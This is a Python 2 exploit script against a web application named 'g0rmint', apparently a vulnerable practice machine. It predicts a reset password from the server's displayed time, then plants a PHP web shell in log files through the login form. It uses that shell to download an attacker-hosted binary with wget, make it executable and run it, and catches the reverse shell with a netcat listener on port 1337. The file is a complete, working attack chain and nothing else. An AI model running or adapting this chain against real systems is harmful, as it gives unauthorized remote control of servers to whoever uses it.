#!/usr/bin/python
import sys
import time
import base64
import hashlib
import requests
import datetime
import threading
import subprocess

_RED = '\x1b[1;31m'
_BLU = '\x1b[1;34m'
_GRE = '\x1b[1;32m'
_RST = '\x1b[0;0;0m'

successMessage = lambda x: '{}[+]{} {}'.format(_GRE, _RST, x)
errorMessage = lambda x: '{}[-]{} {}'.format(_RED, _RST, x)
infoMessage = lambda x: '{}[*]{} {}'.format(_BLU, _RST, x)

if len(sys.argv) < 4:
    print errorMessage('Usage: {} <rhost> <lhost> <username> <email> <binary path>'.format(sys.argv[0]))
    print errorMessage('Where: ')
    print '\t- The remote IP address is the address of the remote server;'
    print '\t- The local IP address of the attacking system;'
    print '\t- The username & email are credentials of the account to reset the password;'
    print '\t- The reverse shell in the /var/www/html/ folder (Msfvenom recommended).\n'
    print errorMessage('Note, nc is required and you have to enable apache2 service.')
    sys.exit(1)
else:
    ip = sys.argv[1]
    lhost = sys.argv[2]
    username = sys.argv[3]
    email = sys.argv[4]
    path = sys.argv[5]

def sending(url, s):
    command = base64.b64encode('/bin/bash -c /tmp/rshell')
    res = s.get(url + command)

def recv():
    subprocess.call(['nc -lnvp 1337'], shell=True)

payload = {
    'email': email,
    'user': username,
    'submit': 'reset'
}

print infoMessage('Trying to reset the password of: ')
print '\t{} : {}'.format(email, username)
res = requests.post("http://" + ip + "/g0rmint/reset.php", data=payload)

if res.status_code != 200:
    print errorMessage('Ooouups something goes wrong!')
    sys.exit(1)
print successMessage('Gotcha!\n')

# Dirty as fuck ...
gmt = res.content.split('Page loaded at <b>')[1].split('</b> Standard GMT Time</div>\n')[0]

print infoMessage('Standard GMT Time: ')
print '\t{}\n'.format(gmt)

# Magik
password = hashlib.sha1(gmt).hexdigest()[:20]
print infoMessage('Making magic ...')
print successMessage('New password: {}\n'.format(password))

print infoMessage('Poisoning log files with the following payload: ')
rce = '<pre><?php echo shell_exec(base64_decode($_GET[cmd])); ?></pre>'
print '\t' + rce

payload = {
    'email': rce,
    'pass': password,
    'submit': 'submit'
}

res = requests.post("http://" + ip + "/g0rmint/login.php", data=payload)
if res.status_code != 200:
    print errorMessage('Ooouups something goes wrong!')
    sys.exit(1)
print successMessage('Log files successfully poisoned!\n')

print infoMessage('Trying to log in the web app')
s = requests.Session()
payload = {
    'email': email,
    'pass': password,
    'submit': 'submit'
}

res = s.post("http://" + ip + "/g0rmint/login.php", data=payload)
if res.status_code != 200:
    print erroMessage('Ooouups something goes wrong!')
    sys.exit(1)
print successMessage('Successfully logged in the web app!\n')

print infoMessage('Getting the reverse shell')
logfile = datetime.datetime.today().strftime('%Y-%m-%d') + '.php'
url = 'http://' + ip + '/g0rmint/s3cr3t-dir3ct0ry-f0r-l0gs/' + logfile + '?cmd='

print infoMessage('Uploading the reverse shell')
command = base64.b64encode('/usr/bin/wget http://' + lhost + '/' + path + ' -O /tmp/rshell')
res = s.get(url + command)
time.sleep(4)

print infoMessage('Changing permissions')
command = base64.b64encode('chmod 777 /tmp/rshell')
res = s.get(url + command)
'''
print infoMessage('Executing the reverse shell')
command = base64.b64encode('/bin/bash -c /tmp/rshell')
res = s.get(url + command)
'''

thread1 = threading.Thread(target=recv)
thread2 = threading.Thread(target=sending, args=(url, s,))

thread1.start()
thread2.start()
